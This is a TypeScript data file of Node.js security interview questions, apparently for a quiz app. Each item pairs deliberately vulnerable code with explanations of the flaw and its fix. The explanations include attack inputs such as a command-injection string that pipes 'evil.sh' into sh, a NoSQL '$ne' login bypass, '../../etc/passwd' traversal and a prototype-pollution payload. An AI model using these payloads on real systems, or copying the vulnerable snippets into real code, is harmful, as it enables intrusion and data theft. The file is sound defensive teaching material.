import type { Question } from '../types';

const OWASP_API_TOP10 = {
  label: 'OWASP API Security Top 10 — 2023',
  url: 'https://api-security.owasp.org/editions/2023/en/0x11-t10/',
};
const OWASP_NODE = {
  label: 'OWASP — Node.js Security Cheat Sheet',
  url: 'https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html',
};
const NODE_SECURITY_BP = {
  label: 'Node.js — Security Best Practices',
  url: 'https://nodejs.org/learn/getting-started/security-best-practices',
};

export const security: Question[] = [
  {
    id: 'sec-password-hashing',
    category: 'security',
    level: 'junior',
    type: 'code',
    challenge: 'bad-practice',
    prompt: 'Review this login code. What is wrong with how passwords are stored and checked, and what would you use instead?',
    codeLang: 'js',
    code: `import crypto from 'node:crypto';

function hashPassword(password) {
  return crypto.createHash('sha256').update(password).digest('hex');
}

async function login(email, password) {
  const user = await db.users.findByEmail(email);
  if (!user) throw new HttpError(404, 'User not found');
  if (hashPassword(password) !== user.passwordHash) {
    throw new HttpError(401, 'Wrong password');
  }
  return user;
}`,
    keyPoints: [
      'SHA-256 is a fast hash: attackers with a leaked database can try billions of guesses per second on GPUs. Passwords need a slow, memory-hard password hashing function.',
      'No salt: identical passwords produce identical hashes and precomputed (rainbow) tables work. Password hashing libraries generate a random per-user salt and store it in the hash string.',
      'Use Argon2id (argon2 package, or crypto.argon2 in recent Node versions), scrypt (crypto.scrypt with a random salt) or bcrypt with a sufficient cost; follow OWASP’s current parameters and rehash on login when you raise them.',
      'Compare with the library’s verify function, or crypto.timingSafeEqual on equal-length buffers, rather than !==.',
      'Different errors for "user not found" and "wrong password" allow account enumeration: return the same 401 message (and ideally similar timing).',
      'Pair with rate limiting and breached-password checks; never log passwords.',
    ],
    followUps: ['What is a pepper, and where would you keep it?'],
    sources: [
      {
        label: 'OWASP — Password Storage Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html',
      },
      { label: 'Node.js docs — Crypto', url: 'https://nodejs.org/api/crypto.html' },
    ],
  },
  {
    id: 'sec-security-headers',
    category: 'security',
    level: 'junior',
    type: 'concept',
    prompt: 'A teammate adds app.use(helmet()) to the Express app. What does it do, and is it enough to make the API secure?',
    keyPoints: [
      'helmet sets HTTP response headers that enable browser protections: Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options: nosniff, X-Frame-Options (clickjacking), Referrer-Policy, Cross-Origin-* policies, and removes X-Powered-By.',
      'HSTS tells browsers to use HTTPS only; it only makes sense when the site is fully served over HTTPS.',
      'CSP mostly protects HTML pages from XSS; for a JSON-only API, nosniff, HSTS and Cache-Control: no-store on sensitive responses matter more.',
      'Headers are defence in depth. They do not fix injection, broken authorization, missing validation or CORS misconfiguration.',
      'Removing X-Powered-By hides the framework but is not real protection; keep dependencies patched.',
    ],
    sources: [
      { label: 'Helmet.js', url: 'https://helmet.js.org/' },
      { label: 'OWASP — HTTP Headers Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html' },
      { label: 'Express — Security best practices', url: 'https://expressjs.com/en/advanced/best-practice-security/' },
    ],
  },
  {
    id: 'sec-command-injection',
    category: 'security',
    level: 'junior',
    type: 'code',
    challenge: 'bad-practice',
    prompt: 'This endpoint generates thumbnails. What can an attacker do with it, and how would you rewrite it?',
    codeLang: 'js',
    code: `import { exec } from 'node:child_process';

app.get('/thumbnail', (req, res) => {
  const file = req.query.file;
  exec(\`convert uploads/\${file} -resize 200x200 /tmp/thumb.png\`, (err) => {
    if (err) return res.status(500).send(err.message);
    res.sendFile('/tmp/thumb.png');
  });
});`,
    keyPoints: [
      'Command injection: exec runs the string through a shell, so ?file=a.png;curl evil.sh|sh or $(...) runs arbitrary commands as the Node process user.',
      'Use execFile or spawn with an argument array (no shell), and never shell: true with user input.',
      'Validate the input against an allowlist (e.g. an id that maps to a stored file name); also block path traversal (../) and arguments starting with - (argument injection; use -- where the tool supports it).',
      'Prefer a library over shelling out (e.g. sharp for images).',
      'Other problems: a shared /tmp/thumb.png path races between concurrent requests, and err.message leaks internals to the client.',
      'Least privilege limits the damage: unprivileged user, container, and Node’s permission model can block child processes entirely.',
    ],
    sources: [
      { label: 'Node.js docs — Child process', url: 'https://nodejs.org/api/child_process.html' },
      {
        label: 'OWASP — OS Command Injection Defense Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html',
      },
    ],
  },
  {
    id: 'sec-bola',
    category: 'security',
    level: 'mid',
    type: 'code',
    challenge: 'bug',
    prompt: 'This endpoint passed code review and requires a logged-in user. A security report says any customer can read anyone’s orders. Explain and fix.',
    codeLang: 'js',
    code: `app.get('/orders/:id', requireAuth, async (req, res) => {
  const order = await Order.findById(req.params.id);
  if (!order) return res.sendStatus(404);
  res.json(order);
});`,
    keyPoints: [
      'Broken Object Level Authorization (BOLA/IDOR), API1 in the OWASP API Security Top 10: authentication is checked, but not whether this user may access this object.',
      'Fix: scope the query to the caller, e.g. Order.findOne({ _id: req.params.id, customerId: req.user.id }), or load the order and check ownership/tenant before responding.',
      'Return 404 rather than 403 for objects the user cannot see, to avoid confirming that they exist.',
      'Random UUIDs make ids harder to guess but are not authorization; ids leak through URLs, logs and other endpoints.',
      'Put the check in the service/data-access layer so every entry point (REST, GraphQL, jobs) gets it, and add tests that user A cannot read user B’s resources.',
      'Also review the response shape: return only the fields the client needs.',
    ],
    sources: [
      {
        label: 'OWASP API1:2023 — Broken Object Level Authorization',
        url: 'https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/',
      },
      OWASP_API_TOP10,
      {
        label: 'OWASP — IDOR Prevention Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html',
      },
    ],
  },
  {
    id: 'sec-mass-assignment',
    category: 'security',
    level: 'mid',
    type: 'code',
    challenge: 'bug',
    prompt: 'Users can edit their profile with this endpoint. What can a malicious user do, and how would you fix it?',
    codeLang: 'ts',
    code: `app.patch('/users/me', requireAuth, async (req, res) => {
  const user = await prisma.user.update({
    where: { id: req.user.id },
    data: req.body,
  });
  res.json(user);
});`,
    keyPoints: [
      'Mass assignment: the whole request body goes into the update, so a user can send { "role": "admin" }, { "emailVerified": true } or change credits, tenantId or passwordHash.',
      'Response side: returning the full row can leak passwordHash and internal fields. OWASP API3:2023 (Broken Object Property Level Authorization) covers both problems.',
      'Fix with an explicit allowlist: validate the body with a schema (zod with .strict() or .pick, Ajv with additionalProperties: false) and build the data object from known fields only.',
      'Limit output too: Prisma select/omit or a response DTO/serializer.',
      'TypeScript types do not help at runtime: req.body is whatever the client sent.',
      'Privileged fields (role, verified) should only change through dedicated, authorized flows.',
    ],
    sources: [
      {
        label: 'OWASP API3:2023 — Broken Object Property Level Authorization',
        url: 'https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/',
      },
      { label: 'OWASP — Mass Assignment Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html' },
      { label: 'Zod', url: 'https://zod.dev/' },
    ],
  },
  {
    id: 'sec-nosql-injection',
    category: 'security',
    level: 'mid',
    type: 'code',
    challenge: 'bug',
    prompt: 'There is no string concatenation here, so a colleague says injection is impossible. Show how to log in as admin without the password, and fix every problem you see.',
    codeLang: 'js',
    code: `app.use(express.json());

app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await db.collection('users').findOne({ email, password });
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  req.session.userId = user._id;
  res.json({ ok: true });
});`,
    keyPoints: [
      'NoSQL operator injection: the body is JSON, so password can be an object. {"email":"admin@example.com","password":{"$ne":null}} matches the admin document.',
      'Validate types and shape at the boundary (zod/Ajv/Fastify schemas): email and password must be strings.',
      'Defence in depth: cast values or use $eq explicitly, Mongoose’s sanitizeFilter option, and never pass user input into $where or $function.',
      'Passwords are stored in plaintext: store an Argon2id/bcrypt hash, look the user up by email only, then verify the hash.',
      'Regenerate the session on login (req.session.regenerate) to prevent session fixation, and rate-limit the endpoint.',
      'Query strings can carry objects too (?password[$ne]=x with an extended query parser such as Express 4’s default).',
    ],
    sources: [
      { label: 'PortSwigger — NoSQL injection', url: 'https://portswigger.net/web-security/nosql-injection' },
      OWASP_NODE,
      { label: 'MongoDB docs — $ne', url: 'https://www.mongodb.com/docs/manual/reference/operator/query/ne/' },
    ],
  },
  {
    id: 'sec-sessions-vs-jwt',
    category: 'security',
    level: 'mid',
    type: 'concept',
    prompt:
      'For a web app with a Node.js API, would you use server-side sessions or JWTs? Cover revocation, where the token lives in the browser, and the most common JWT mistakes.',
    keyPoints: [
      'Sessions: an opaque random id in a cookie, state in a store (Redis/DB). Easy revocation and logout, one lookup per request.',
      'JWT: signed, self-contained claims verified without a lookup, handy across services; but they cannot be revoked before exp without a denylist or other state.',
      'Common compromise: short-lived access tokens (minutes) plus a refresh token that is stored server-side, rotated on every use and revocable; reuse of an old refresh token signals theft.',
      'Browser storage: httpOnly, Secure, SameSite cookies keep tokens away from JavaScript (XSS); localStorage is readable by any injected script. Cookies bring CSRF back, so use SameSite plus CSRF protection for state-changing requests.',
      'JWT pitfalls: using decode() instead of verify(); accepting alg "none" or algorithm confusion (RS256 public key used as an HS256 secret), so pin the allowed algorithms; not checking exp, iss and aud; weak HMAC secrets; putting secrets or PII in the payload (it is only base64url-encoded).',
      'For a single web app with one backend, sessions are usually simpler and safer.',
    ],
    followUps: ['How would you log a user out of all devices with JWTs?'],
    sources: [
      { label: 'OWASP — JSON Web Token Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html' },
      {
        label: 'OWASP — Session Management Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html',
      },
      { label: 'RFC 8725 — JSON Web Token Best Current Practices', url: 'https://www.rfc-editor.org/info/rfc8725/' },
      { label: 'PortSwigger — Algorithm confusion attacks', url: 'https://portswigger.net/web-security/jwt/algorithm-confusion' },
    ],
  },
  {
    id: 'sec-cors-reflect',
    category: 'security',
    level: 'mid',
    type: 'code',
    challenge: 'bug',
    prompt:
      'The frontend team needed CORS working "for any environment", so someone added this middleware. The API uses cookie sessions. What is the risk, and how should CORS and CSRF be handled?',
    codeLang: 'js',
    code: `app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  next();
});`,
    keyPoints: [
      'Reflecting any Origin together with Allow-Credentials lets every website make authenticated requests with the victim’s cookies and read the responses: account data theft.',
      'Browsers refuse "*" with credentials, which is why people reflect the origin, which is worse.',
      'Fix: an explicit allowlist of exact origins (from config per environment), echo only matching origins, add Vary: Origin, and never allow "null". Avoid loose checks like origin.endsWith(\'example.com\') (evilexample.com matches).',
      'CORS only controls which origins can read responses in a browser; it is not access control, and non-browser clients ignore it.',
      'CSRF is a separate problem: a cross-site form POST still sends cookies even if the response is unreadable. Use SameSite=Lax or Strict cookies, CSRF tokens or Origin/Sec-Fetch-Site checks for state-changing requests, and never change state on GET.',
    ],
    sources: [
      { label: 'MDN — Cross-Origin Resource Sharing (CORS)', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS' },
      { label: 'PortSwigger — CORS vulnerabilities', url: 'https://portswigger.net/web-security/cors' },
      {
        label: 'OWASP — CSRF Prevention Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html',
      },
    ],
  },
  {
    id: 'sec-path-traversal',
    category: 'security',
    level: 'mid',
    type: 'code',
    challenge: 'bug',
    prompt: 'This endpoint lets users download their uploaded files. Find the vulnerability and write a safe version.',
    codeLang: 'js',
    code: `import fs from 'node:fs';
import path from 'node:path';

const UPLOAD_DIR = path.resolve('uploads');

app.get('/download', (req, res) => {
  const filePath = path.join(UPLOAD_DIR, req.query.file);
  fs.createReadStream(filePath)
    .on('error', () => res.sendStatus(404))
    .pipe(res);
});`,
    keyPoints: [
      'Path traversal: path.join normalises ../ segments, so ?file=../../etc/passwd or ../.env escapes the uploads directory (URL-encoded %2e%2e%2f is decoded before it reaches the handler).',
      'Fix: const target = path.resolve(UPLOAD_DIR, file); if (!target.startsWith(UPLOAD_DIR + path.sep)) return res.sendStatus(403). Check the resolved path, not the raw string.',
      'path.resolve treats an absolute argument as a new root, which is exactly why the startsWith check after resolving is required.',
      'Validate that file is a single string (query params can be arrays), and use fs.realpath if symlinks may exist inside the directory.',
      'Better: do not take paths from users at all. Store files under generated ids, look up the record and check the user owns it (this endpoint has no authorization either).',
      'Alternatively res.sendFile(name, { root: UPLOAD_DIR }) rejects paths that escape root.',
    ],
    sources: [
      { label: 'OWASP — Path Traversal', url: 'https://community.owasp.org/attacks/Path_Traversal' },
      { label: 'Node.js docs — Path', url: 'https://nodejs.org/api/path.html' },
      OWASP_NODE,
    ],
  },
  {
    id: 'sec-rate-limiting',
    category: 'security',
    level: 'mid',
    type: 'concept',
    prompt: 'Attackers are running credential stuffing against your login endpoint from thousands of IPs. How do you protect it, and how does rate limiting work across many Node instances?',
    keyPoints: [
      'Limit per IP and per account/username: per-IP alone fails against botnets, per-account alone lets one IP try many accounts.',
      'Progressive delays or temporary lockouts, CAPTCHA after repeated failures, MFA, and checking passwords against breach lists. Hard lockouts let attackers lock out real users.',
      'In-memory counters do not work across instances: keep counters in a shared store such as Redis (atomic INCR + EXPIRE, sliding windows or token buckets).',
      'Respond with 429 Too Many Requests and Retry-After; return identical errors for unknown user and wrong password.',
      'Behind a proxy, configure trust proxy correctly so the client IP comes from X-Forwarded-For set by your own proxy, not from a header the attacker controls.',
      'Also rate-limit at the edge/API gateway, and cap other expensive operations (body size, page size, password reset, SMS) as covered by OWASP API4 (Unrestricted Resource Consumption).',
    ],
    sources: [
      {
        label: 'OWASP — Credential Stuffing Prevention Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html',
      },
      {
        label: 'OWASP API4:2023 — Unrestricted Resource Consumption',
        url: 'https://api-security.owasp.org/editions/2023/en/0xa4-unrestricted-resource-consumption/',
      },
      { label: 'rate-limiter-flexible', url: 'https://github.com/animir/node-rate-limiter-flexible' },
    ],
  },
  {
    id: 'sec-secrets-logging',
    category: 'security',
    level: 'mid',
    type: 'concept',
    prompt: 'How do you manage secrets (database passwords, API keys, signing keys) for a Node.js service, and how do you make sure they and users’ personal data do not end up in logs?',
    keyPoints: [
      'Never commit secrets: .env files only for local development and gitignored; scan repositories and CI for leaks (secret scanning, gitleaks).',
      'In production load secrets from a secret manager (Vault, cloud secret managers) or platform-injected env vars/files at runtime; do not bake them into Docker images or build args.',
      'Least privilege per service, rotation without redeploys, and short-lived credentials (workload identity/IAM roles) instead of long-lived keys where possible.',
      'Use a structured logger with redaction (e.g. pino redact paths) for Authorization headers, cookies, passwords, tokens and card data; do not log full request bodies by default.',
      'Minimise PII in logs (mask, hash or omit), set retention, restrict log access; log security events (failed logins, authorization denials) without the sensitive values.',
      'Do not leak stack traces or internal errors in API responses.',
    ],
    sources: [
      { label: 'OWASP — Secrets Management Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html' },
      { label: 'OWASP — Logging Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html' },
      { label: 'pino — Redaction', url: 'https://github.com/pinojs/pino/blob/main/docs/redaction.md' },
    ],
  },
  {
    id: 'sec-prototype-pollution',
    category: 'security',
    level: 'senior',
    type: 'code',
    challenge: 'output',
    prompt: 'User preferences are merged into defaults with this helper. What does the last line print, why is it a security problem, and how do you prevent it?',
    codeLang: 'js',
    code: `function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

const defaults = { theme: 'light', notifications: { email: true } };
const body = JSON.parse('{"theme":"dark","__proto__":{"isAdmin":true}}');
const settings = merge(structuredClone(defaults), body);

const user = { name: 'eve' };
console.log(settings.theme, user.isAdmin);`,
    keyPoints: [
      'It prints: dark true',
      'JSON.parse creates an own property named "__proto__"; for...in visits it, target["__proto__"] is Object.prototype, so the recursive merge writes isAdmin onto Object.prototype.',
      'Every object in the process now inherits isAdmin: true, which can bypass checks like if (user.isAdmin), change library options, or lead to denial of service or even code execution through gadgets.',
      'Fix the merge: skip __proto__, constructor and prototype keys, only copy own properties (Object.hasOwn), and validate input with a schema that rejects unknown keys.',
      'Use Object.create(null) or Map for dictionaries built from user keys; Object.freeze(Object.prototype) or node --disable-proto=delete|throw as hardening.',
      'Keep dependencies updated: many merge/set-path libraries (lodash.merge, set-value) had prototype pollution CVEs.',
    ],
    sources: [
      {
        label: 'OWASP — Prototype Pollution Prevention Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html',
      },
      { label: 'PortSwigger — Prototype pollution', url: 'https://portswigger.net/web-security/prototype-pollution' },
      { label: 'Node.js docs — CLI (--disable-proto)', url: 'https://nodejs.org/api/cli.html' },
    ],
  },
  {
    id: 'sec-redos',
    category: 'security',
    level: 'senior',
    type: 'code',
    challenge: 'bug',
    prompt:
      'A single request with a 40-character display name makes the whole service stop responding, including health checks. Explain what is happening and how you would fix and prevent it.',
    codeLang: 'js',
    code: `const DISPLAY_NAME = /^([a-zA-Z0-9]+\\s?)+$/;

app.post('/profile', (req, res) => {
  const { displayName } = req.body;
  if (!DISPLAY_NAME.test(displayName)) {
    return res.status(400).json({ error: 'Invalid display name' });
  }
  // ...
});

// Payload: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"`,
    keyPoints: [
      'ReDoS: the nested quantifier ( [...]+ \\s? )+ lets the engine split the input into groups in exponentially many ways; when the match fails at "!", the backtracking engine tries them all.',
      'JavaScript regex runs synchronously on the main thread, so one request blocks the event loop and every other request, timer and health check waits.',
      'Fix the pattern so it is unambiguous, e.g. /^[a-zA-Z0-9]+(?: [a-zA-Z0-9]+)*$/, and limit input length before matching.',
      'Prevent: lint for unsafe regexes, use a linear-time engine (re2 bindings) for user-supplied or complex patterns, never build regexes from user input without escaping.',
      'Detect: event loop lag monitoring and CPU profiles show the time spent in the regex; dependencies with vulnerable regexes appear in advisories (CWE-1333).',
    ],
    sources: [
      { label: 'OWASP — ReDoS', url: 'https://community.owasp.org/attacks/Regular_expression_Denial_of_Service_-_ReDoS' },
      { label: 'Node.js — Don’t Block the Event Loop', url: 'https://nodejs.org/learn/asynchronous-work/dont-block-the-event-loop' },
      { label: 'node-re2', url: 'https://github.com/uhop/node-re2' },
    ],
  },
  {
    id: 'sec-ssrf',
    category: 'security',
    level: 'senior',
    type: 'code',
    challenge: 'implement',
    prompt:
      'Implement a link-preview endpoint that fetches a user-supplied URL and returns its <title>. The service runs in the cloud next to internal services. What must your implementation defend against?',
    codeLang: 'js',
    code: `app.post('/preview', requireAuth, async (req, res) => {
  const response = await fetch(req.body.url);
  const html = await response.text();
  res.json({ title: html.match(/<title>(.*?)<\\/title>/i)?.[1] ?? null });
});`,
    keyPoints: [
      'SSRF (OWASP API7): the server can be made to request http://169.254.169.254/ (cloud metadata credentials), localhost admin ports or internal services that trust the network.',
      'Parse with new URL(), allow only http/https and standard ports, and use a domain allowlist when the use case permits it.',
      'Resolve the hostname and reject loopback, private, link-local and unique-local ranges (IPv4 and IPv6, including IPv4-mapped IPv6), then connect to the validated IP (custom lookup on the agent) to avoid DNS rebinding.',
      'Disable automatic redirects (redirect: \'manual\') or re-validate every hop; set timeouts and a maximum response size, and do not return raw upstream errors or bodies.',
      'Network-level controls catch what code misses: an egress proxy, firewall rules from the fetcher, IMDSv2 on AWS, running the fetcher in an isolated service.',
    ],
    sources: [
      {
        label: 'OWASP API7:2023 — Server Side Request Forgery',
        url: 'https://api-security.owasp.org/editions/2023/en/0xa7-server-side-request-forgery/',
      },
      {
        label: 'OWASP — SSRF Prevention Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
      },
      { label: 'PortSwigger — SSRF', url: 'https://portswigger.net/web-security/ssrf' },
    ],
  },
  {
    id: 'sec-oauth-pkce',
    category: 'security',
    level: 'senior',
    type: 'concept',
    prompt:
      'Your SPA and Node.js API need "Sign in with Google" plus access to your own API. Explain the authorization code flow with PKCE, the difference between OAuth 2.0 and OpenID Connect, and where you would keep the tokens.',
    keyPoints: [
      'OAuth 2.0 is delegated authorization (access tokens for APIs); OpenID Connect adds authentication on top: an ID token (JWT) describing the user, plus nonce and userinfo.',
      'Flow: redirect to the authorization server with client_id, redirect_uri, scope, state and code_challenge; the user signs in; the browser returns with a short-lived code; the backend exchanges code + code_verifier for tokens.',
      'PKCE: random code_verifier, code_challenge = BASE64URL(SHA-256(verifier)) with method S256, so a stolen code is useless. Current best practice (RFC 9700, OAuth 2.1) recommends PKCE for all clients; implicit and password grants should not be used.',
      'Validate state (CSRF), use exact redirect URI matching, and verify ID tokens: signature via JWKS, iss, aud, exp, nonce.',
      'Backend-for-frontend: the Node server does the code exchange and keeps tokens server-side, giving the SPA an httpOnly session cookie, so tokens are not exposed to XSS.',
      'Use a certified library (e.g. openid-client) instead of hand-rolling the protocol; client credentials grant is for service-to-service.',
    ],
    sources: [
      { label: 'oauth.net — PKCE', url: 'https://oauth.net/2/pkce/' },
      { label: 'RFC 9700 — OAuth 2.0 Security Best Current Practice', url: 'https://www.rfc-editor.org/info/rfc9700/' },
      { label: 'OpenID — How OpenID Connect works', url: 'https://openid.net/developers/how-connect-works/' },
      { label: 'OWASP — OAuth 2.0 Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html' },
    ],
  },
  {
    id: 'sec-authorization-model',
    category: 'security',
    level: 'senior',
    type: 'design',
    prompt:
      'Your multi-tenant SaaS has admins, members and guests, plus rules like "members can edit documents they own, in their own tenant, unless the document is locked". How would you design authorization?',
    keyPoints: [
      'RBAC (roles → permissions) is simple and auditable but explodes when rules depend on data; ABAC evaluates attributes of user, resource and context (owner, tenant, locked); ReBAC models relationships (Zanzibar-style).',
      'Typically combine: roles for coarse permissions, attribute/ownership checks for object-level rules.',
      'Enforce in the service/domain layer close to the data, not only in route middleware, so REST, GraphQL, queues and scripts share the same checks; deny by default.',
      'Centralise policies in code (a policy module, CASL) or a policy engine (OPA, Cedar, OpenFGA) so rules are testable and reviewed in one place.',
      'Tenant isolation as a second layer: always filter by tenant_id, optionally Postgres row-level security.',
      'Test an authorization matrix (role × action × ownership), log denials, and cover function-level checks for admin endpoints (OWASP API5).',
    ],
    sources: [
      { label: 'OWASP — Authorization Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html' },
      {
        label: 'OWASP API5:2023 — Broken Function Level Authorization',
        url: 'https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/',
      },
      { label: 'PostgreSQL docs — Row Security Policies', url: 'https://www.postgresql.org/docs/current/ddl-rowsecurity.html' },
    ],
  },
  {
    id: 'sec-supply-chain-sandbox',
    category: 'security',
    level: 'senior',
    type: 'concept',
    prompt:
      'A popular package deep in your dependency tree was compromised and its install script stole CI tokens. How do you reduce supply-chain risk, and can Node itself contain a malicious package or untrusted code at runtime?',
    keyPoints: [
      'Commit the lockfile and install with npm ci in CI: it installs exactly the lockfile and fails if it does not match package.json.',
      'Review and stage dependency updates (Renovate/Dependabot, optionally with a delay before adopting new releases), run npm audit, and verify registry signatures and provenance with npm audit signatures.',
      'Install scripts are the main entry point: use --ignore-scripts where possible or a package manager that blocks dependency scripts by default (pnpm v10), and keep CI secrets scoped and short-lived.',
      'Watch for typosquatting and dependency confusion: use scoped packages and configure private registries explicitly; prefer fewer, well-maintained dependencies.',
      'When publishing: 2FA, trusted publishing/provenance from CI instead of long-lived tokens.',
      'Runtime: eval and node:vm are not security mechanisms, and the permission model (--permission with --allow-fs-read, --allow-net, etc.) is a seat belt for trusted code that its docs say malicious code can bypass. Real isolation means separate processes or containers with no secrets, limited network egress and least privilege.',
    ],
    sources: [
      { label: 'OWASP — NPM Security Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html' },
      { label: 'npm docs — npm ci', url: 'https://docs.npmjs.com/cli/commands/npm-ci/' },
      { label: 'npm docs — Generating provenance statements', url: 'https://docs.npmjs.com/generating-provenance-statements/' },
      { label: 'Node.js docs — Permissions', url: 'https://nodejs.org/api/permissions.html' },
      { label: 'Node.js docs — VM (not a security mechanism)', url: 'https://nodejs.org/api/vm.html' },
      NODE_SECURITY_BP,
    ],
  },
];
